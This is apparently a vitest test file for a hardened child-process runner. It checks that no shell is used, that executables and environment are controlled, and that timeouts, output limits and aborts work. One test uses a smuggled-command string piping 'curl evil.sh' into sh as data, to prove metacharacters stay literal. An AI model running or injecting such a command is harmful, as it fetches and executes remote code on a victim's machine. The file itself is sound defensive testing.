import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { ProcessError } from "../../src/process/errors.js";
import { buildEnvironment, runProcess } from "../../src/process/exec.js";

/** A real, absolute, OS-native executable to drive the tests with. */
const NODE = process.execPath;

let workspace: string;

beforeEach(() => {
  workspace = mkdtempSync(join(tmpdir(), "studio-process-"));
});

afterEach(() => {
  rmSync(workspace, { recursive: true, force: true });
});

/** Runs a snippet of JavaScript in a child process. */
function node(script: string, options: Partial<Parameters<typeof runProcess>[0]> = {}) {
  return runProcess({
    executable: NODE,
    args: ["-e", script],
    cwd: workspace,
    ...options,
  });
}

describe("running a command", () => {
  it("returns stdout, stderr, and the exit code", async () => {
    const result = await node(
      "process.stdout.write('out'); process.stderr.write('err'); process.exit(0)",
    );

    expect(result.stdout).toBe("out");
    expect(result.stderr).toBe("err");
    expect(result.exitCode).toBe(0);
  });

  it("treats a non-zero exit as a result, not a failure", async () => {
    // `git diff --quiet` exits 1 to mean "there are differences" and grep exits
    // 1 for "no matches". Throwing would make every caller re-interpret them.
    const result = await node("process.exit(3)");

    expect(result.exitCode).toBe(3);
  });

  it("writes stdin when the caller supplies it", async () => {
    const result = await node(
      "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>process.stdout.write(d.toUpperCase()))",
      { stdin: "hello" },
    );

    expect(result.stdout).toBe("HELLO");
  });

  it("closes stdin when the caller does not, rather than hanging", async () => {
    const result = await node(
      "process.stdin.on('end',()=>{process.stdout.write('closed')});process.stdin.resume()",
      { timeoutMs: 5_000 },
    );

    expect(result.stdout).toBe("closed");
  });
});

describe("no shell is involved", () => {
  it("passes metacharacters through as literal text", async () => {
    // The whole substrate design rests on this. If a shell were involved, this
    // argument would be four commands instead of one branch name.
    const hostile = "main; curl evil.sh | sh && echo pwned `whoami` $(id) %PATH%";
    const result = await node("process.stdout.write(process.argv[1])", {
      args: ["-e", "process.stdout.write(process.argv[1])", hostile],
    });

    expect(result.stdout).toBe(hostile);
  });

  it("refuses an argument containing a null character", async () => {
    // A NUL truncates the argument at the OS boundary, so what runs would not
    // be what was validated.
    await expect(node("", { args: ["-e", "0", "a\0b"] })).rejects.toThrow(ProcessError);
  });
});

describe("the executable is checked before anything starts", () => {
  it("refuses a bare command name", async () => {
    // A bare name is resolved through PATH by the OS, which puts the choice of
    // binary in the hands of whatever is installed on the machine.
    await expect(
      runProcess({ executable: "node", args: ["-e", "0"], cwd: workspace }),
    ).rejects.toThrow(/absolute path/i);
  });

  it.runIf(process.platform === "win32")("refuses a batch file", async () => {
    // `.bat` and `.cmd` cannot run without a shell, and cmd.exe would reparse
    // our arguments (CVE-2024-27980).
    const batch = join(workspace, "tool.bat");
    writeFileSync(batch, "@echo off\r\necho hi\r\n");

    await expect(
      runProcess({ executable: batch, args: [], cwd: workspace }),
    ).rejects.toThrow(/batch files/i);
  });

  it("reports a missing executable as a spawn failure", async () => {
    await expect(
      runProcess({
        executable: join(workspace, "does-not-exist.exe"),
        args: [],
        cwd: workspace,
      }),
    ).rejects.toThrow(ProcessError);
  });
});

describe("the environment is built, not inherited", () => {
  it("does not pass the host environment to the child", async () => {
    process.env.STUDIO_EXEC_LEAK_PROBE = "super-secret";
    try {
      const result = await node(
        "process.stdout.write(String(process.env.STUDIO_EXEC_LEAK_PROBE))",
      );

      expect(result.stdout).toBe("undefined");
    } finally {
      delete process.env.STUDIO_EXEC_LEAK_PROBE;
    }
  });

  it("does not pass PATH, so a child cannot find unapproved tools", () => {
    expect(buildEnvironment()).not.toHaveProperty("PATH");
  });

  it("passes what the caller supplies", async () => {
    const result = await node("process.stdout.write(String(process.env.STUDIO_TEST_VAR))", {
      env: { STUDIO_TEST_VAR: "provided" },
    });

    expect(result.stdout).toBe("provided");
  });

  it("lets the caller's policy override the OS defaults", () => {
    expect(buildEnvironment({ TEMP: "C:\\pinned" }).TEMP).toBe("C:\\pinned");
  });
});

describe("a run is bounded", () => {
  it("stops a command that exceeds its deadline", async () => {
    await expect(node("setTimeout(() => {}, 30000)", { timeoutMs: 250 })).rejects.toThrow(
      /took too long/i,
    );
  });

  it("reports a timeout as retryable, unlike a rejected argument", async () => {
    let error: ProcessError | undefined;
    try {
      await node("setTimeout(() => {}, 30000)", { timeoutMs: 250 });
    } catch (caught) {
      error = caught as ProcessError;
    }

    expect(error?.code).toBe("process.timeout");
    expect(error?.retryable).toBe(true);
  });

  it("stops a command that floods its output", async () => {
    // Killed rather than truncated: returning the first slice as if complete
    // would let a caller reason about a partial answer without knowing it.
    await expect(
      node("process.stdout.write('x'.repeat(200000))", { maxOutputBytes: 1_000 }),
    ).rejects.toThrow(/too much output/i);
  });

  it("stops a command when the caller aborts", async () => {
    const controller = new AbortController();
    const running = node("setTimeout(() => {}, 30000)", { signal: controller.signal });
    controller.abort();

    await expect(running).rejects.toThrow(/cancelled/i);
  });

  it("refuses to start when the signal is already aborted", async () => {
    await expect(node("0", { signal: AbortSignal.abort() })).rejects.toThrow(/cancelled/i);
  });
});
